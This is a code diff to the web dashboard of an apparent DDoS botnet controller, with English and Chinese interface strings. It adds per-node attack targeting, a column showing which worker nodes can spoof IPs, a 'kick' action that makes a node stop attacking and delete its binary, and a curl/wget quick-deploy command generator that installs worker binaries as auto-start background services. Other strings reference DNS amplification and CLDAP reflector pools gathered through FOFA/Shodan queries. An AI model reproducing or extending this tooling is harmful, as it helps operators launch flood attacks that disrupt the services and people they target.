@@ -52,7 +52,7 @@
   .login-box input { text-align:center; font-size:14px; padding:10px; }
   .login-box .btn { width:100%; padding:10px; font-size:14px; margin-top:8px; }
   .login-error { color:var(--red); font-size:12px; margin-top:8px; }
-  .worker-cmd { background:var(--bg); border:1px solid var(--border); border-radius:4px; padding:10px; font-size:11px; color:var(--green); word-break:break-all; margin-top:6px; }
+  .worker-cmd { background:var(--bg); border:1px solid var(--border); border-radius:4px; padding:10px; font-size:11px; color:var(--green); white-space:nowrap; overflow-x:auto; margin-top:6px; -webkit-user-select:all; user-select:all; }
   .deploy-opt { display:flex; align-items:center; gap:6px; cursor:pointer; }
   .deploy-opt input[type="checkbox"] { width:auto; flex:0 0 auto; margin:0; }
   .progress-bar { height:4px; background:var(--bg); border-radius:2px; overflow:hidden; margin-top:2px; }
@@ -141,6 +141,26 @@
       </select>
     </div>
     <textarea x-model="form.target" :placeholder="t('target_placeholder')" rows="2" style="min-height:45px;margin-bottom:6px"></textarea>
+    <!-- 目标节点选择（默认全开） -->
+    <div style="border:1px solid var(--border);border-radius:4px;padding:6px;margin-bottom:6px;font-size:11px">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
+        <span style="color:var(--cyan)" x-text="t('target_nodes')"></span>
+        <span>
+          <a href="#" @click.prevent="selectAllNodes()" style="margin-right:8px" x-text="t('select_all')"></a>
+          <a href="#" @click.prevent="selectedNodes=[]" x-text="t('select_none')"></a>
+        </span>
+      </div>
+      <div style="max-height:70px;overflow-y:auto;display:flex;flex-wrap:wrap;gap:4px">
+        <template x-for="n in nodes" :key="n.worker_id">
+          <label style="display:flex;align-items:center;gap:3px;cursor:pointer;font-size:10px;background:var(--border);padding:2px 6px;border-radius:3px;white-space:nowrap">
+            <input type="checkbox" :value="n.worker_id" x-model="selectedNodes" style="width:auto;margin:0">
+            <span x-text="n.worker_id"></span>
+            <span x-show="n.can_spoof" style="color:var(--green)" x-text="'S'"></span>
+          </label>
+        </template>
+        <span x-show="nodes.length===0" style="opacity:0.5" x-text="t('no_nodes_hint')"></span>
+      </div>
+    </div>
     <div class="form-row">
       <input x-model.number="form.duration" type="number" :placeholder="t('duration')" value="60">
       <input x-model.number="form.threads" type="number" :placeholder="t('threads')" value="10">
@@ -282,16 +302,21 @@
   <div class="panel">
     <h2 x-text="t('worker_nodes') + ' (' + nodes.length + ')'"></h2>
     <table>
-      <thead><tr><th x-text="t('col_id')"></th><th x-text="t('col_ip')"></th><th x-text="t('col_os')"></th><th x-text="t('col_cpu')"></th><th x-text="t('col_mem')"></th><th x-text="t('col_status')"></th></tr></thead>
+      <thead><tr><th x-text="t('col_id')"></th><th x-text="t('col_ip')"></th><th x-text="t('col_os')"></th><th x-text="t('col_spoof')"></th><th x-text="t('col_cpu')"></th><th x-text="t('col_mem')"></th><th x-text="t('col_status')"></th><th></th></tr></thead>
       <tbody>
         <template x-for="n in nodes" :key="n.worker_id">
           <tr>
             <td x-text="n.worker_id" style="color:var(--cyan);font-size:11px"></td>
             <td x-text="n.ip || '-'"></td>
             <td x-text="n.is_windows ? 'Windows' : 'Linux'"></td>
+            <td>
+              <span x-show="n.can_spoof" style="color:var(--green);font-size:10px" x-text="t('spoof_yes')"></span>
+              <span x-show="!n.can_spoof" style="color:#f66;font-size:10px" x-text="t('spoof_no')"></span>
+            </td>
             <td x-text="(n.cpu_percent||0) + '%'"></td>
             <td x-text="(n.memory_mb||0) + ' MB'"></td>
             <td><span :class="'status ' + n.status"></span><span x-text="n.status"></span></td>
+            <td><button class="btn danger sm" @click="kickNode(n.worker_id)" x-text="t('kick')"></button></td>
           </tr>
         </template>
       </tbody>
@@ -411,7 +436,12 @@
             <label class="deploy-opt"><input type="checkbox" x-model="deployInstall" @change="toggleInstall()"> <span x-text="t('deploy_install')"></span></label>
             <label class="deploy-opt"><input type="checkbox" x-model="deployDaemon" @change="buildDeployCmd()"> <span x-text="t('deploy_daemon')"></span></label>
           </div>
-          <div class="worker-cmd" style="margin-top:0;min-height:32px" x-text="deployCmd || t('deploy_cmd_empty')"></div>
+          <div style="display:flex;gap:6px;align-items:center;margin-top:6px">
+            <label class="deploy-opt" style="font-size:11px"><input type="radio" value="curl" x-model="deployTool" @change="buildDeployCmd()"> curl</label>
+            <label class="deploy-opt" style="font-size:11px"><input type="radio" value="wget" x-model="deployTool" @change="buildDeployCmd()"> wget</label>
+            <button class="btn" @click="copyDeployCmd()" style="flex:0;white-space:nowrap;margin-left:auto" x-text="t('copy')"></button>
+          </div>
+          <div class="worker-cmd" style="margin-top:6px;min-height:32px" x-text="deployCmd || t('deploy_cmd_empty')"></div>
           <div style="margin-top:8px;font-size:10px;color:var(--text);opacity:0.6;white-space:pre-line" x-text="t('deploy_tip')"></div>
           <div style="border-top:1px solid var(--border);margin:10px 0 8px"></div>
           <h3 style="font-size:12px;margin-bottom:6px" x-text="t('update_worker')"></h3>
@@ -553,11 +583,14 @@ function app() {
       add_to_pool:'Add to Pool', add_all_to_pool:'Add all to DNS pool', add_all_to_cldap:'Add all to CLDAP pool', resolvers_found:'resolvers found', reflectors_found:'reflectors found',
       fofa_tips:'FOFA / Shodan query tips', cldap_export_tip:'Export as IP:Port list, paste to CLDAP pool page for batch add & auto-verify',
       worker_nodes:'Worker Nodes', tasks:'Tasks', steam_pool:'Steam Master Pool', manual_pool:'Manual Pool',
+      col_spoof:'Spoof', spoof_yes:'YES', spoof_no:'NO', kick:'Kick',
+      kick_confirm:'Kick node {0}? It will stop attacks, exit and delete its binary.',
+      target_nodes:'Target Nodes', select_all:'All', select_none:'None', no_nodes_hint:'no nodes connected',
       force_refresh:'Force Refresh Now', test_clean:'Test All & Clean', testing:'Testing...',
       manual_add_placeholder:'1.2.3.4:27015 (one per line)',
       proxy_manager:'Proxy Manager', save_proxy:'Save Proxy File', load_proxy:'Load from Server',
       dns_amp:'DNS Amp Domain', dns_amp_hint:'Enter a domain with large TXT record (up to 4096B). If set, DNS pool validation uses TXT query against this domain instead of isc.org.',
-      save:'Save',
+      copy:'Copy', copy_manual:'Copy manually (clipboard blocked):',
       quick_deploy:'Quick Deploy', deploy_storage_ph:'Cloud storage URL (worker binary)', deploy_cmd_empty:'Set storage URL then Save to generate command',
       deploy_proxy:'Fetch L7 proxies (-proxy)', deploy_install:'Install auto-start service (-install)', deploy_daemon:'Run in background (-daemon)',
       deploy_grpc_port:'gRPC port:', deploy_grpc_port_hint:'(auto, leave empty)',
@@ -599,11 +632,14 @@ function app() {
       add_to_pool:'加入池', add_all_to_pool:'全部加入DNS池', add_all_to_cldap:'全部加入CLDAP池', resolvers_found:'个解析器发现', reflectors_found:'个反射器发现',
       fofa_tips:'FOFA / Shodan 查询提示', cldap_export_tip:'导出格式选 IP:Port 列表，粘贴到 CLDAP 池页面批量添加并自动验证',
       worker_nodes:'工作节点', tasks:'任务', steam_pool:'Steam 主池', manual_pool:'手动池',
+      col_spoof:'伪造', spoof_yes:'支持', spoof_no:'不支持', kick:'踢出',
+      kick_confirm:'踢出节点 {0}？它将停止攻击、退出并删除自身二进制。',
+      target_nodes:'目标节点', select_all:'全选', select_none:'清空', no_nodes_hint:'无节点连接',
       force_refresh:'立即刷新', test_clean:'测试清理', testing:'测试中...',
       manual_add_placeholder:'1.2.3.4:27015 (每行一个)',
       proxy_manager:'代理管理', save_proxy:'保存代理文件', load_proxy:'从服务器加载',
       dns_amp:'DNS 放大域名', dns_amp_hint:'输入大TXT记录(最大4096B)的域名。若填写则DNS验证使用此域名的TXT查询替代 isc.org。',
-      save:'保存',
+      save:'保存', copy:'复制', copy_manual:'剪贴板被阻止，请手动复制:',
       quick_deploy:'快速上线', deploy_storage_ph:'云存储 URL (worker 二进制直链)', deploy_cmd_empty:'先设置存储 URL 并保存以生成命令',
       deploy_proxy:'拉取 L7 代理 (-proxy)', deploy_install:'安装自启动服务 (-install)', deploy_daemon:'后台运行 (-daemon)',
       deploy_grpc_port:'gRPC 端口:', deploy_grpc_port_hint:'(自动，留空)',
@@ -626,8 +662,9 @@ function app() {
   return {
     token:'', error:'', authed:false, lang:localStorage.getItem('lang')||'en',
     nodes:[], tasks:[], totalPPS:0, totalMBps:0, totalPackets:0,
+    selectedNodes:[],
     activeWorkers:0, onlineNodes:0, uptime:0, ws:null,
-    deployStorage:'', deployProxy:false, deployInstall:false, deployDaemon:false, deployCmd:'', deployGrpcPort:'9090',
+    deployStorage:'', deployProxy:false, deployInstall:false, deployDaemon:false, deployCmd:'', deployGrpcPort:'9090', deployTool:'curl',
     updateVersion:'', updateURL:'', updateStatus:'', updateCheckResult:null, updateChecking:false, updateApplying:false,
     form:{ method:'vse', game:'', target:'', duration:60, threads:10, packet_size:1400, rate_limit_pps:0, rate_limit_bps:0, burst_mode:false, mix:false, jitter_ms:0, fallback_to_udp:true, sub_attacks:[] },
     templates:[], selectedTemplate:'',
@@ -695,7 +732,14 @@ function app() {
       this.ws.onclose = () => setTimeout(() => this.connectWS(), 2000);
     },
 
-    async fetchNodes() { try { const r = await fetch('/api/nodes',{headers:this.getAuthHeaders()}); this.nodes = await r.json(); } catch(e) {} },
+    async fetchNodes() {
+      try { const r = await fetch('/api/nodes',{headers:this.getAuthHeaders()}); this.nodes = await r.json();
+        // 默认全选节点；新节点上线时自动加入选中
+        const onlineIds = this.nodes.map(n=>n.worker_id);
+        this.selectedNodes = onlineIds.filter(id=>this.selectedNodes.includes(id));
+        if (this.selectedNodes.length === 0) this.selectedNodes = onlineIds;
+      } catch(e) {}
+    },
     async fetchTasks() { try { const r = await fetch('/api/tasks',{headers:this.getAuthHeaders()}); this.tasks = await r.json(); } catch(e) {} },
     async fetchStats() {
       try { const r = await fetch('/api/stats',{headers:this.getAuthHeaders()}); const s = await r.json();
@@ -708,8 +752,20 @@ function app() {
       const lines = (payload.target||'').split('\n').filter(l=>l.trim());
       if (lines.length>1) { payload.targets = lines.map(l=>l.trim()).filter(l=>l); delete payload.target; }
       if (payload.method==='combo') payload.sub_attacks = payload.sub_attacks||[];
+      // 节点选择：未全选时提交选中的节点；全选/空 = 全部在线节点
+      if (this.selectedNodes && this.selectedNodes.length !== this.nodes.length) {
+        payload.workers = this.selectedNodes;
+      }
       await fetch('/api/tasks',{method:'POST',headers:this.getAuthHeaders(),body:JSON.stringify(payload)});
       this.fetchTasks();
+    },
+
+    selectAllNodes() { this.selectedNodes = this.nodes.map(n=>n.worker_id); },
+
+    async kickNode(id) {
+      if (!confirm(this.t('kick_confirm').replace('{0}', id))) return;
+      await fetch('/api/nodes/'+id+'/kick',{method:'POST',headers:this.getAuthHeaders()});
+      this.fetchNodes();
     },
 
     async stopTask(id) { await fetch('/api/tasks/'+id+'/stop',{method:'POST',headers:this.getAuthHeaders()}); this.fetchTasks(); },
@@ -851,6 +907,7 @@ function app() {
       // Controller 全自动：公网 IP 自动探测 + gRPC/HTTP 端口从监听地址推导
       // + token 从 data/auth/worker.token 读取。gRPC 端口仅需在非默认时覆盖。
       const params = new URLSearchParams();
+      if (this.deployTool) params.set('tool', this.deployTool);
       const grpcPort = this.deployGrpcPort || '';
       if (grpcPort && grpcPort !== '9090') params.set('grpc_port', grpcPort);
       if (this.deployProxy) params.set('proxy','1');
@@ -859,6 +916,10 @@ function app() {
       try { const r = await fetch('/api/deploy/command?'+params.toString(),{headers:this.getAuthHeaders()}); const d = await r.json();
         if (d.error) { this.deployCmd = ''; if (d.error!=='storage URL not configured') alert(d.error); return; }
         if (d.command) this.deployCmd = d.command; else this.deployCmd = ''; } catch(e) {}
+    },
+    async copyDeployCmd() {
+      if (!this.deployCmd) return;
+      try { await navigator.clipboard.writeText(this.deployCmd); this.deployCmdCopied = true; setTimeout(()=>this.deployCmdCopied=false,1500); } catch(e) { prompt(this.t('copy_manual'), this.deployCmd); }
     },
 
     async loadDNSAmp() { try { const r = await fetch('/api/dnsamp',{headers:this.getAuthHeaders()}); const d = await r.json(); this.dnsAmpDomain = d.domain||''; } catch(e) {} },
